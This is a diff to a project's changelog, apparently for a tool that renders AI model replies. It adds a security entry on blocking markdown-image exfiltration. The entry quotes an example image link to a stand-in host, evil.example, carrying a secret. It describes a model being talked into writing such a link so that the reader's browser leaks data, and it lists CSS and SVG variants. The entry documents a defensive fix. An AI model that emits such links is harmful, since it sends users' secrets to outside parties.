@@ -6,6 +6,20 @@ adheres to [Semantic Versioning](https://semver.org/) and the format is based on
 
 ## [Unreleased]
 
+### Security
+
+- **Replies can no longer load URLs by themselves (markdown image
+  exfiltration).** DOMPurify's defaults let a reply contain `<img>`, so a model
+  talked into writing `![](https://evil.example/?d=<secret>)` made the reader's
+  browser send the secret out the moment the reply rendered — and `style`
+  attributes/tags (`background:url()`, `@import`), `srcset`, media posters, SVG
+  images and image inputs could do the same. All of these are now removed;
+  an image renders as its alt text. Links always get `rel="noopener noreferrer"`.
+  - **Behaviour change:** images in replies no longer show by default. To keep
+    them, add **`allow-images`**, ideally with **`image-hosts`** — an allowlist
+    of URL prefixes (`https:` only, loaded with no referrer).
+  - Markdown task-list checkboxes still render.
+
 ### Fixed
 
 - **Playground: sidebar clicks needed 3-4 presses while a reply streamed in the
